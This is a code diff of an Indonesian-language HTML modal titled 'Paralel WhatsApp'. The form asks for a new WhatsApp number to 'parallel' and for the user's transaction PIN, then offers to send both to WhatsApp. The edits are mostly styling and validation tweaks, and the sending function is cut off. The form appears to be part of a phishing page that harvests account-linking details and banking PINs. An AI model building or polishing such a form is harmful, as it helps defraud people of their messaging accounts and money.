@@ -1,4 +1,4 @@
-<!-- Tombol Buka Modal -->
+ <!-- Tombol Buka Modal -->
 <button onclick="document.getElementById('modalParalel').classList.remove('hidden')" 
   class="bg-blue-600 text-white px-4 py-2 rounded-lg">
   Buka Form Paralel WA
@@ -6,11 +6,11 @@
 
 <!-- Modal Fullscreen -->
 <div id="modalParalel" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex justify-center items-center px-4 hidden">
-  <div class="bg-white w-full h-full max-w-md mx-auto p-6 overflow-y-auto rounded-none sm:rounded-2xl shadow-xl relative">
+  <div class="bg-white w-full h-full max-w-md mx-auto p-6 overflow-y-auto sm:rounded-2xl shadow-xl relative">
 
     <!-- Tombol Tutup -->
     <button onclick="document.getElementById('modalParalel').classList.add('hidden')" 
-      class="absolute top-4 right-4 text-gray-500 hover:text-red-500 text-xl font-bold">
+      class="absolute top-4 right-4 text-gray-500 hover:text-red-500 text-2xl font-bold">
       ×
     </button>
 
@@ -18,33 +18,28 @@
     <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">Paralel WhatsApp</h2>
 
     <!-- Kolom Nomor WA -->
-    <label class="block text-sm font-medium text-gray-700 mb-1">Masukkan Nomor WhatsApp Baru Yang Akan Di Paralel</label>
-    <div class="relative mb-4">
-      <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">
-        📱
-      </span>
+    <label class="block text-sm font-medium text-gray-700 mb-1">Masukkan Nomor WhatsApp Baru</label>
+    <div class="relative mb-5">
+      <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">📱</span>
       <input
         type="text"
         id="waNumber"
         placeholder="Contoh: 6281234567890"
-        class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
-        oninput="validateForm(); this.value = this.value.replace(/[^0-9]/g, '')"
+        class="w-full text-base pl-10 pr-4 py-4 border border-gray-300 rounded-xl transition focus:outline-none focus:ring-2 focus:ring-blue-500"
+        oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateForm()"
       />
     </div>
 
     <!-- Kolom PIN -->
     <label class="block text-sm font-medium text-gray-700 mb-1">Masukkan PIN Transaksi Anda</label>
     <div class="relative mb-6">
-      <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">
-        🔐
-      </span>
+      <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">🔐</span>
       <input
         type="text"
         id="waPin"
         placeholder="Masukkan PIN Anda"
-        maxlength="6"
-        class="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
-        oninput="validateForm(); this.value = this.value.replace(/[^0-9]/g, '')"
+        class="w-full text-base pl-10 pr-4 py-4 border border-gray-300 rounded-xl transition focus:outline-none focus:ring-2 focus:ring-blue-500"
+        oninput="this.value = this.value.replace(/[^a-zA-Z0-9]/g, ''); validateForm()"
       />
     </div>
 
@@ -52,7 +47,7 @@
     <button
       id="submitButton"
       onclick="kirimParalel()"
-      class="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3 rounded-xl transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
+      class="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-4 rounded-xl transition duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
       disabled
     >
       Kirim ke WhatsApp
@@ -62,14 +57,23 @@
 
 <script>
   function validateForm() {
-    const nomor = document.getElementById("waNumber").value.trim();
-    const pin = document.getElementById("waPin").value.trim();
+    const nomorInput = document.getElementById("waNumber");
+    const pinInput = document.getElementById("waPin");
     const tombol = document.getElementById("submitButton");
 
-    const isValidNomor = nomor.length >= 10; // minimal panjang no WA 10 digit
-    const isValidPin = /^[0-9]{4,6}$/.test(pin); // PIN 4-6 digit angka
+    const nomor = nomorInput.value.trim();
+    const pin = pinInput.value.trim();
 
-    tombol.disabled = !(isValidNomor && isValidPin);
+    // Validasi nomor minimal 10 digit dan mulai 628 / 08
+    const validNomor = nomor.length >= 10;
+    const validPin = /^[a-zA-Z0-9]{4,}$/.test(pin); // 4+ huruf/angka tanpa spasi/karakter khusus
+
+    // Aktifkan tombol jika semua valid
+    tombol.disabled = !(validNomor && validPin);
+
+    // Tambahkan efek border hijau saat valid
+    nomorInput.classList.toggle("border-green-500", validNomor);
+    pinInput.classList.toggle("border-green-500", validPin);
   }
 
   function kirimParalel() {
